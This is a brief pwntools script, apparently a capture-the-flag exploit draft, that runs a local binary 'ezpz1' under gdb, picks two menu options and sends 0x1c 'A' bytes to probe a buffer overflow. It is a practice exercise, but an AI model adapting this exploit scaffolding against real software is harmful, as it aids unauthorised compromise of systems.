from pwn import *

script = 'b *set_question'
p = process('./ezpz1')
gdb.attach(p,gdbscript=script)
p.recv()
p.sendline('C')
p.recv()
p.sendline('S')
p.recv()
p.sendline('A'*0x1c)
p.interactive()
